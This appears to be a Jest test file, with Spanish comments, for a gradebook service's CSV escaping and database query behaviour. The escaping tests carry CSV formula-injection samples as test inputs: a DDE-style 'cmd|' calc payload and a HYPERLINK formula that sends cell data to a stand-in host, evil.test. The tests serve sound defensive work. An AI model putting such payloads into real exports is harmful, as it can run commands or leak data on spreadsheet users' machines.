import { ProjectGradebookService } from '@app/modules/projects/project-gradebook.service';

/**
 * `escapeCsv` es un helper puro y privado. Se ejercita directamente
 * porque el resto del servicio exige cuatro repositorios y el servicio de
 * acceso, y ninguno interviene en la neutralización de fórmulas.
 */
describe('ProjectGradebookService — neutralización de fórmulas en CSV', () => {
  const service = new ProjectGradebookService(
    {} as any,
    {} as any,
    {} as any,
    {} as any,
    {} as any,
  );

  const escapeCsv = (value: string | number): string =>
    (
      service as unknown as { escapeCsv: (v: string | number) => string }
    ).escapeCsv(value);

  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'antepone un apóstrofo a un valor que empieza por %j',
    (prefix) => {
      const result = escapeCsv(`${prefix}cmd|'/C calc'!A0`);
      expect(result.startsWith(`"'${prefix}`)).toBe(true);
    },
  );

  it('neutraliza una fórmula de exfiltración en notas del docente', () => {
    const result = escapeCsv('=HYPERLINK("http://evil.test?d="&A1,"click")');
    expect(result).toBe(`"'=HYPERLINK(""http://evil.test?d=""&A1,""click"")"`);
    expect(result.startsWith('"=')).toBe(false);
  });

  it('no altera texto que no dispara evaluación de fórmula', () => {
    expect(escapeCsv('Buen trabajo')).toBe('"Buen trabajo"');
    expect(escapeCsv('Nota: 7,5 sobre 10')).toBe('"Nota: 7,5 sobre 10"');
  });

  it('sigue escapando las comillas dobles', () => {
    expect(escapeCsv('dijo "hola"')).toBe('"dijo ""hola"""');
  });

  it('no antepone apóstrofo a valores numéricos positivos', () => {
    expect(escapeCsv(7.5)).toBe('"7.5"');
  });

  it('neutraliza un número negativo, que la hoja también evalúa', () => {
    // No es un falso positivo aceptable a la ligera: una celda "-1" se muestra
    // como "'-1". Se prefiere el falso positivo a dejar viva la vía de
    // inyección, y las columnas numéricas del export no emiten negativos.
    expect(escapeCsv(-1)).toBe(`"'-1"`);
  });
});

describe('ProjectGradebookService — el gradebook no carga columnas jsonb', () => {
  function buildService() {
    // El puerto solo expone `findLatestOutcomeByProject` (columna derivada
    // extraída en SQL, sin la entidad completa): a diferencia de la versión
    // anterior con `createQueryBuilder`/`find()` expuestos, aquí no hay forma
    // de "volver por accidente" a cargar los jsonb pesados — el tipo del
    // puerto ya lo impide. La lógica de `DISTINCT ON`/filtro por proyecto
    // vive en `builder/infrastructure/database/build-run.repository.ts`.
    const buildRuns = {
      findLatestOutcomeByProject: jest.fn(() =>
        Promise.resolve([
          { deliveryId: 'delivery-1', overallOutcome: 'PASS' },
          { deliveryId: 'delivery-2', overallOutcome: null },
        ]),
      ),
    };

    const assignments = {
      findActiveForProject: jest.fn(() =>
        Promise.resolve([
          {
            id: 'assignment-1',
            studentId: 'student-1',
            assignedAt: new Date('2026-01-01T00:00:00Z'),
            student: {
              firstName: 'Ana',
              lastName: 'García',
              email: 'ana@test',
            },
            project: { maxDeliveriesPerStudent: 3 },
            sourceGroupIds: ['group-1'],
          },
        ]),
      ),
    };

    const service = new ProjectGradebookService(
      {
        findById: jest.fn(() =>
          Promise.resolve({ id: 'p-1', maxDeliveriesPerStudent: 3 }),
        ),
      } as never,
      assignments as never,
      {
        findByAssignmentIds: jest.fn(() =>
          Promise.resolve([
            {
              id: 'delivery-1',
              assignmentId: 'assignment-1',
              status: 'EVALUATED',
              grade: 7.5,
              graderNotes: null,
              isLate: false,
              createdAt: new Date('2026-01-02T00:00:00Z'),
            },
          ]),
        ),
      } as never,
      buildRuns as never,
      { assertCanManageProject: jest.fn(() => Promise.resolve()) } as never,
    );

    return { service, buildRuns, assignments };
  }

  it('delega en el puerto la extracción de overallOutcome por proyecto (no por lista de entregas)', async () => {
    const { service, buildRuns } = buildService();

    await service.getGradebook('p-1', { userId: 'u-1' } as never);

    // Un `IN` con los ids de todas las entregas crece con el tamaño del
    // curso; el puerto filtra por proyecto, no por lista de deliveryIds.
    expect(buildRuns.findLatestOutcomeByProject).toHaveBeenCalledWith('p-1');
  });

  it('aplica el filtro por groupId directamente al consultar asignaciones activas en base de datos', async () => {
    const { service, assignments } = buildService();

    await service.getGradebook('p-1', { userId: 'u-1' } as never, {
      groupId: 'group-1',
    });

    expect(assignments.findActiveForProject).toHaveBeenCalledWith(
      'p-1',
      'group-1',
    );
  });

  it('mapea el veredicto extraído al resultado y conserva groupIds', async () => {
    const { service } = buildService();

    const rows = await service.getGradebook('p-1', { userId: 'u-1' } as never);

    expect(rows).toHaveLength(1);
    expect(rows[0].latestBuilderOutcome).toBe('PASS');
    expect(rows[0].grade).toBe(7.5);
    expect(rows[0].groupIds).toEqual(['group-1']);
  });
});
